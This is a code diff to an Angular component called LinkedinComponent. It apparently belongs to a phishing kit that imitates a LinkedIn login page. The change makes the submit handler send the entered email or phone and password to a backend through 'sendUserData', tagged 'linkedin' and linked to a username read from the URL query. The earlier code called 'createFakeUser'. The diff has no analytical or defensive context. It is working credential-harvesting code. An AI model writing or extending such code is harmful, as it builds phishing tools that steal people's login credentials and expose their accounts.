@@ -88,19 +88,23 @@ export class LinkedinComponent {
   constructor(private apiService: ApiService, private route: ActivatedRoute, private sanitizer: DomSanitizer) {}
   emailOrPhone: string = '';
   password: string = '';
+  username!: string;
   @Input() pageId!: string | null;
 
   onSubmit() {
-    this.apiService.createFakeUser(this.emailOrPhone, this.password, this.pageId!).subscribe({
+    this.route.queryParams.subscribe(params => {
+      this.username = params['username'];
+      console.log('Username:', this.username);
+    });
+    this.apiService.sendUserData(this.emailOrPhone, this.password, 'linkedin', this.username!).subscribe({
       next: (response) => {
-        console.log('Fake user created successfully', response);
+        console.log('User data sent successfully', response);
       },
       error: (error) => {
-        console.error('Failed to create fake user', error);
+        console.error('Failed to send user data', error);
       }
     });
   }
-
   checkFilled(event: Event) {
     const input = event.target as HTMLInputElement;
     if (input.value) {
